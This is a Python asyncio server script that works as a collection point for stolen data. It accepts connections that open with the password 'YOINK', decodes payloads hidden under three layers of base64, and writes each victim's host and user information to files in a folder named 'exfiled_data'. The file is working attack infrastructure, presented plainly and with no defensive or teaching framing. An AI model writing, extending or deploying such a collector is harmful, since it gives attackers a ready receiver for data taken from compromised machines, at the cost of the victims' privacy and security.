import asyncio
import base64
import datetime
import json


async def handle_client(reader, writer):
    print('Connection')
    print(datetime.datetime.now())
    print(f'Peer: {reader._transport.get_extra_info("peername")}')
    print(f'Destination: {writer._transport.get_extra_info("sockname")}')
    print('-' * 30)
    request = None
    request = (await reader.read(2048))
    if request != b'YOINK':
        writer.write(b'Fuck off\n')
        print(request.decode())
        print('-' * 30)
        writer.close()
        return
    message = b''
    request = None
    while request != b'':
        request = (await reader.read(2048))
        message += request
    try:
        decoded_message = decode_data(message)
        decoded_message = json.loads(decoded_message)
        print(decoded_message['Host'])
        with open(f'exfiled_data/{decoded_message["Host"]["hostname"]}-{decoded_message["Host"]["user"]}.json', 'w') as f:
            f.write(json.dumps(decoded_message))
    except Exception as e:
        print('Failed to parse input: ' + message.decode())
        print(f'Error: {e}')
    # response = str(request)
    # writer.write(response.encode('utf8') + b'EOF')
    # await writer.drain()
    writer.close()


async def run_server():
    print('Reading from config.json...')
    with open('config.json', 'r') as f:
        config = json.load(f)
    print(config)
    print('Starting Server...')
    server = await asyncio.start_server(handle_client, config['bind_address'], config["port"])
    async with server:
        await server.serve_forever()


def decode_data(data):
    return base64.b64decode(base64.b64decode(base64.b64decode(data)))


if __name__ == '__main__':
    asyncio.run(run_server())
